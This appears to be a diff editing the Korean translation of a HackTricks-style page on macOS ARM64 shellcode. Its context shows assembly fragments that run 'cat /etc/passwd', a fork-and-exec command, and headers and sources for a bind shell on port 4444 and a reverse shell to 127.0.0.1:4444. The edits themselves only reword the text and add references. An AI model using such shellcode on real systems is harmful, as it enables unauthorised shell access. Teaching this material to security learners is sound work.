-이 코드는 [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)에서 가져온 것이며 설명합니다.
+[**여기**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)에서 가져와 설명합니다.<sup>[1]</sup>
 
 {{#tabs}}
 {{#tab name="with adr"}}
@@ -554,7 +554,7 @@ sh_path: .asciz "/bin/sh"
 
 #### cat으로 읽기
 
-목표는 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`를 실행하는 것이므로, 두 번째 인자(x1)는 파라미터들의 배열이며(메모리 상에서는 이는 주소들의 스택을 의미한다).
+목표는 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`을 실행하는 것이므로, 두 번째 인수(x1)는 매개변수 배열입니다(메모리에서는 주소가 저장된 스택을 의미함).
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -580,7 +580,7 @@ cat_path: .asciz "/bin/cat"
 .align 2
 passwd_path: .asciz "/etc/passwd"
 ```
-#### fork에서 sh로 명령을 실행하여 메인 프로세스가 종료되지 않도록 하기
+#### main process가 종료되지 않도록 fork에서 sh로 command 실행
 ```armasm
 .section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
 .global _main              ; Declare a global symbol _main
@@ -626,7 +626,7 @@ touch_command: .asciz "touch /tmp/lalala"
 ```
 #### Bind shell
 
-Bind shell은 [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)에서 가져온 것으로, **port 4444**에서 실행됩니다.
+**port 4444**의 Bind shell ([https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s))<sup>[2]</sup>
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -710,7 +710,7 @@ svc  #0x1337
 ```
 #### Reverse shell
 
-출처: [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell을 **127.0.0.1:4444**로
+[https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)에서 **127.0.0.1:4444**로 revshell<sup>[3]</sup>
 ```armasm
 .section __TEXT,__text
 .global _main
@@ -777,4 +777,10 @@ mov  x2, xzr
 mov  x16, #59
 svc  #0x1337
 ```
+## 참고 문헌
+
+- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
+- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
+- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)
+
 {{#include ../../../banners/hacktricks-training.md}}
